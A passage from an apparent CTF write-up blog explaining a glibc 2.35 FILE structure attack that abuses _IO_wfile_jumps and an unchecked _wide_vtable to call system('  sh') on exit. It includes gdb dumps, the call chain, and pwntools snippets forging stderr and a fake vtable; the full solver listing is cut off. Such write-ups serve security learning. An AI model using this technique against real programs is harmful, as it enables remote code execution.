</span></span><span class="line"><span class="cl">  __underflow = 0x7ffff7e19050 &lt;__GI__IO_wfile_underflow&gt;,
</span></span><span class="line"><span class="cl">  __uflow = 0x7ffff7e178c0 &lt;__GI__IO_wdefault_uflow&gt;,
</span></span><span class="line"><span class="cl">  __pbackfail = 0x7ffff7e17680 &lt;__GI__IO_wdefault_pbackfail&gt;,
</span></span><span class="line"><span class="cl">  __xsputn = 0x7ffff7e1a8c0 &lt;__GI__IO_wfile_xsputn&gt;,
</span></span><span class="line"><span class="cl">  __xsgetn = 0x7ffff7e1f330 &lt;__GI__IO_file_xsgetn&gt;,
</span></span><span class="line"><span class="cl">  __seekoff = 0x7ffff7e197d0 &lt;__GI__IO_wfile_seekoff&gt;,
</span></span><span class="line"><span class="cl">  __seekpos = 0x7ffff7e22530 &lt;_IO_default_seekpos&gt;,
</span></span><span class="line"><span class="cl">  __setbuf = 0x7ffff7e1e620 &lt;_IO_new_file_setbuf&gt;,
</span></span><span class="line"><span class="cl">  __sync = 0x7ffff7e1a720 &lt;__GI__IO_wfile_sync&gt;,
</span></span><span class="line"><span class="cl">  __doallocate = 0x7ffff7e13f10 &lt;_IO_wfile_doallocate&gt;,
</span></span><span class="line"><span class="cl">  __read = 0x7ffff7e1f9b0 &lt;__GI__IO_file_read&gt;,
</span></span><span class="line"><span class="cl">  __write = 0x7ffff7e1ef40 &lt;_IO_new_file_write&gt;,
</span></span><span class="line"><span class="cl">  __seek = 0x7ffff7e1e6f0 &lt;__GI__IO_file_seek&gt;,
</span></span><span class="line"><span class="cl">  __close = 0x7ffff7e1e610 &lt;__GI__IO_file_close&gt;,
</span></span><span class="line"><span class="cl">  __stat = 0x7ffff7e1ef30 &lt;__GI__IO_file_stat&gt;,
</span></span><span class="line"><span class="cl">  __showmanyc = 0x7ffff7e234a0 &lt;_IO_default_showmanyc&gt;,
</span></span><span class="line"><span class="cl">  __imbue = 0x7ffff7e234b0 &lt;_IO_default_imbue&gt;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s try to take a look at the implementation of one of the functions which is <code>_IO_wfile_overflow</code> (This is the path that was discovered by both kylebot and roderick01).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">wint_t</span>
</span></span><span class="line"><span class="cl"><span class="nf">_IO_wfile_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">wint_t</span> <span class="n">wch</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span> <span class="cm">/* SET ERROR */</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* If currently reading or no buffer allocated. */</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="cm">/* Allocate a buffer if needed. */</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="nf">_IO_wdoallocbuf</span> <span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="p">...</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span>
</span></span><span class="line"><span class="cl"><span class="nf">_IO_wdoallocbuf</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="kt">wint_t</span><span class="p">)</span><span class="nf">_IO_WDOALLOCATE</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="n">WEOF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WIDE_JUMPS(THIS) \
</span></span></span><span class="line"><span class="cl"><span class="cp">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see in the above, if we&rsquo;re able to trigger <code>WJUMP0</code>, there isn&rsquo;t any validation check whether the <code>wide_vtable</code> stored pointer is in the correct region or not, which means if we&rsquo;re able to forge a fake <code>wide_vtable</code> and trigger the macro call (<code>WJUMP0</code>), we can jump to any address that we want just like the old glibc.</p>
<p>Also notice that the <code>vtable</code> that was used during <code>_IO_WIDE_JUMPS</code> will be taken from the <code>fp-&gt;_wide_data-&gt;_wide_vtable</code>. If you revisit the <code>stdfile</code> fields when we inspect it in the <code>gdb</code>, you can see there the <code>stdfile</code> has a field called <code>_wide_data</code>, which points to another struct <code>_IO_wide_data_1</code>. Below is the field stored in the <code>_IO_wide_data_1</code> printed via gdb:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  print _IO_wide_data_1
</span></span><span class="line"><span class="cl">$10 = {
</span></span><span class="line"><span class="cl">  _IO_read_ptr = 0x0,
</span></span><span class="line"><span class="cl">  _IO_read_end = 0x0,
</span></span><span class="line"><span class="cl">  _IO_read_base = 0x0,
</span></span><span class="line"><span class="cl">  _IO_write_base = 0x0,
</span></span><span class="line"><span class="cl">  _IO_write_ptr = 0x0,
</span></span><span class="line"><span class="cl">  _IO_write_end = 0x0,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  _shortbuf = L&#34;&#34;,
</span></span><span class="line"><span class="cl">  _wide_vtable = 0x7ffff7faa0c0 &lt;__GI__IO_wfile_jumps&gt; &lt;- This is the one that we can overwrite with our fake vtable
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on that information, this is the possible chain call to be achieved if we misaligned the FILE <code>vtable</code> from <code>_IO_file_jumps</code> to <code>_IO_wfile_jumps</code> and trigger <code>__overflow</code> call. Below is the chain:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Assuming that we overwrite the FILE-&gt;vtable from _IO_file_jumps to _IO_wfile_jumps. When the binary try to call
</span></span><span class="line"><span class="cl">_IO_OVERFLOW (fp, EOF), the chain would be:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">_IO_OVERFLOW (fp, EOF)
</span></span><span class="line"><span class="cl">|_ JUMP1 (__overflow, fp, EOF)
</span></span><span class="line"><span class="cl">   |_ (_IO_JUMPS_FUNC(fp)-&gt;__overflow) (fp, EOF)
</span></span><span class="line"><span class="cl">      |_ ((IO_validate_vtable (_IO_JUMPS_FILE_plus (fp)))-&gt;__overflow) (fp, EOF) &lt;- Because we overwrite it to point to _IO_wfile_jumps, it will call _IO_wfile_overflow instead of _IO_new_file_overflow. This is still valid because its location is still in the correct region
</span></span><span class="line"><span class="cl">         |_ _IO_wfile_overflow(fp, EOF)
</span></span><span class="line"><span class="cl">            |_ _IO_wdoallocbuf(fp)
</span></span><span class="line"><span class="cl">               |_ _IO_WDOALLOCATE(fp)
</span></span><span class="line"><span class="cl">                  |_ WJUMP0 (__doallocate, fp)
</span></span><span class="line"><span class="cl">                     |_ (_IO_WIDE_JUMPS_FUNC(fp)-&gt;__doallocate) (fp)
</span></span><span class="line"><span class="cl">                         |_ (_IO_WIDE_JUMPS(fp)-&gt;__doallocate) (fp) &lt;- No Validation #profit :D
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes that to achieve this call, there are some constraints that we need to fulfill:</p>
<ul>
<li>In <code>_IO_wfile_overflow</code>, we need to bypass these checks to continue calling <code>_IO_wdoallocbuf</code>:
<ul>
<li><code>if (f-&gt;_flags &amp; _IO_NO_WRITES)</code> need to return False.</li>
<li><code>if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)</code> need to return True.</li>
<li><code>if (f-&gt;_wide_data-&gt;_IO_write_base == 0)</code> need to return True.</li>
</ul>
</li>
<li>In <code>_IO_wdoallocbuf</code>, we need to bypass these checks to continue calling <code>_IO_WDOALLOCATE</code>:
<ul>
<li><code>if (fp-&gt;_wide_data-&gt;_IO_buf_base)</code> need to return False.</li>
<li><code>if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</code> need to return True.
<ul>
<li><code>_IO_UNBUFFERED</code> is <code>0x0002</code>, which means <code>_flags &amp; _IO_UNBUFFERED == 0</code> needs to be achieved.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>And if those constraints are fulfilled, it will jump to the pointer stored in the <code>fp-&gt;_wide_data-&gt;wide_vtable-&gt;__doallocate</code>, where the <code>rdi</code> is a pointer to the FILE itself (<code>fp</code>).</p>
<p>Finally, this is a path that we could take to do FILE Structure Attack in glibc 2.35. For example, we can simply create a fake <code>wide_vtable</code> so that the <code>__doallocate</code> will point to <code>system</code>, which mean when we call <code>_IO_WDOALLOCATE(fp)</code>, it will do <code>system(fp)</code>. And if we forge the <code>fp</code> content to execute <code>sh</code>, that means we will get a shell :D</p>
<p>But first, how can we able to trigger <code>_IO_OVERFLOW</code> in the first place? We can abuse the third menu from the binary, which is <code>exit</code>. You can read the detail about the chain in <a href="https://chovid99.github.io/posts/file-structure-attack-part-1/#the-usage-of-vtable-in-a-file-structure" target="_blank" rel="noopener noreffer ">my previous article about FILE Structure Attack</a>, but the tl;dr is when we call <code>exit</code>, the binary will have a chain call like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exit
</span></span><span class="line"><span class="cl">|_ _IO_cleanup
</span></span><span class="line"><span class="cl">   |_ _IO_flush_all_lockp
</span></span><span class="line"><span class="cl">      Iterate list of available files (stderr-&gt;stdout-&gt;stdin), and on each iteration it will call:
</span></span><span class="line"><span class="cl">      |_ _IO_OVERFLOW (fp, EOF)
</span></span></code></pre></td></tr></table>
</div>
</div><p>The constraint to call <code>_IO_OVERFLOW</code> is here (taken from the <a href="https://elixir.bootlin.com/glibc/glibc-2.24/source/libio/genops.c#L765" target="_blank" rel="noopener noreffer "><code>_IO_flush_all_lockp</code></a> code):</p>
<ul>
<li><code>if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</code>
<ul>
<li>So, we need to set <code>_mode</code> to 0, and <code>_IO_write_ptr &gt; _IO_write_base</code></li>
</ul>
</li>
</ul>
<p>Because <code>exit</code> will iterate all available files, I choose to use the OOB write bug to overwrite the file structure of the <code>stderr</code>. To summarize, what should we do to <code>stderr</code> file structure to gain RCE upon <code>exit</code> are:</p>
<ul>
<li>Create a fake <code>_wide_vtable</code>.
<ul>
<li>I decided to put it in my <code>chunk_addr+0x100</code> address. Notes that our <code>chunk_addr</code> is in <code>libc_base - 0xf7ff0</code>.</li>
<li><code>__doallocate</code> offset is <code>0x68</code>, so fill <code>chunk_addr+0x100+0x68</code> with <code>system</code> address.</li>
</ul>
</li>
<li>Create a fake <code>_wide_data</code>.
<ul>
<li>I decided to put it in <code>chunk_addr</code>.</li>
<li>Set <code>chunk_addr-&gt;_IO_write_base</code> (which is <code>&amp;chunk_addr+0x20</code>) to <code>0</code>.</li>
<li>Set <code>chunk_addr-&gt;_IO_buf_base</code> (which is <code>&amp;chunk_addr+0x38</code>) to <code>0</code>.</li>
<li>Set <code>chunk_addr-&gt;_wide_vtable</code> (which is <code>&amp;chunk_addr+0xe0</code>) to <code>chunk_addr+0x100</code> (which is our <code>fake_wide_vtable</code>).</li>
</ul>
</li>
<li>Set the <code>stderr-&gt;_flags</code> to the correct value. Some important notes:
<ul>
<li>Remember that at the end, because we forge the <code>wide_vtable-&gt;__do_allocate(stderr)</code> to <code>system(stderr)</code>, that means the command that will be executed by <code>system</code> will start from <code>stderr-&gt;_flags</code> (because <code>_flags</code> is <code>&amp;stderr+0x0</code>). We need to ensure that the <code>_flags</code> still fulfill the constraints, yet it&rsquo;s able to execute our command. Some tricks that can be used:
<ul>
<li>kylebot set the <code>_flags</code> to <code>0x3b01010101010101</code>, and <code>_IO_read_ptr</code> to <code>/bin/sh\x00</code>.
<ul>
<li><code>0x3b01010101010101</code> equivalent to <code>\x01\x01\x01\x01\x01\x01\x01;</code>, so by setting it like above, the final call will be <code>system('\x01\x01\x01\x01\x01\x01\x01;/bin/sh')</code>, which will trigger a shell, yet all of the <code>if</code> conditions constraints are fulfilled.</li>
</ul>
</li>
<li>roderick01 set the <code>_flags</code> to &quot;  sh&quot; (with double space in front). This still fulfill the constraints, and will call <code>system(&quot;  sh&quot;)</code> at the end.</li>
</ul>
</li>
</ul>
</li>
<li>Set the <code>stderr-&gt;_IO_write_base</code> to <code>0</code>, and the <code>stderr-&gt;_IO_write_pr</code> to <code>1</code>.
<ul>
<li>So that when we call <code>exit</code>, <code>_IO_flush_all_lockp</code> will call <code>_IO_OVERFLOW(stderr, EOF)</code>.</li>
</ul>
</li>
<li>Set the <code>stderr-&gt;vtable</code> to <code>_IO_wfile_jumps</code>.
<ul>
<li>So that when <code>_IO_OVERFLOW(stderr, EOF)</code> is called, instead of calling <code>_IO_new_file_overflow</code>, it will call <code>_IO_wfile_overflow</code> instead.</li>
</ul>
</li>
</ul>
<p>And after we successfully rewrite the <code>stderr</code> file structure, if we call <code>exit</code>, we should be able to get a shell!</p>
<p>Finally, let&rsquo;s start to continue our script to implement those actions. First, create a fake <code>_wide_vtable</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Setup fake _wide_vtable</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_vtable_addr</span>                         <span class="o">=</span> <span class="n">chunk_addr</span> <span class="o">+</span> <span class="mh">0x100</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_vtable_doallocate_offset_from_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_wide_vtable_addr</span> <span class="o">-</span> <span class="n">chunk_addr</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x68</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span>                                   <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">fake_wide_vtable_doallocate_offset_from_chunk</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, create a fake <code>_wide_data</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Setup fake _wide_data</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_data_addr</span>                            <span class="o">=</span> <span class="n">chunk_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_data_IO_write_base_offset_from_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_wide_data_addr</span> <span class="o">-</span> <span class="n">chunk_addr</span><span class="p">)</span><span class="o">+</span><span class="mh">0x20</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_data_IO_buf_base_offset_from_chunk</span>   <span class="o">=</span> <span class="p">(</span><span class="n">fake_wide_data_addr</span> <span class="o">-</span> <span class="n">chunk_addr</span><span class="p">)</span><span class="o">+</span><span class="mh">0x38</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_wide_data_wide_vtable_offset_from_chunk</span>   <span class="o">=</span> <span class="p">(</span><span class="n">fake_wide_data_addr</span> <span class="o">-</span> <span class="n">chunk_addr</span><span class="p">)</span><span class="o">+</span><span class="mh">0xe0</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)):</span> <span class="c1"># Set _wide_data-&gt;_IO_write_base_offset to 0</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">fake_wide_data_IO_write_base_offset_from_chunk</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)):</span> <span class="c1"># Set _wide_data-&gt;_IO_buf_base_offset to 0</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">fake_wide_data_IO_buf_base_offset_from_chunk</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_wide_vtable_addr</span><span class="p">)):</span> <span class="c1"># Set _wide_data-&gt;_wide_vtable to fake_wide_vtable_addr</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">fake_wide_data_wide_vtable_offset_from_chunk</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, forge the <code>stderr</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Forge stderr</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span>                <span class="o">=</span> <span class="n">FileStructure</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">flags</span>          <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;  sh</span><span class="se">\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_IO_write_ptr</span>  <span class="o">=</span> <span class="mi">1</span> <span class="c1"># _IO_write_ptr &gt; _IO_write_base</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">_wide_data</span>     <span class="o">=</span> <span class="n">fake_wide_data_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr</span><span class="o">.</span><span class="n">vtable</span>         <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_wfile_jumps&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_stderr_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fake_stderr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">fake_stderr_bytes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">stderr_offset_from_chunk</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Exit, and profit :D</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Exit and profit :D</span>
</span></span><span class="line"><span class="cl"><span class="n">exit_binary</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><img src="https://i.imgur.com/Jt3HyvS.png">
<p>Below is the full script for my solver:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
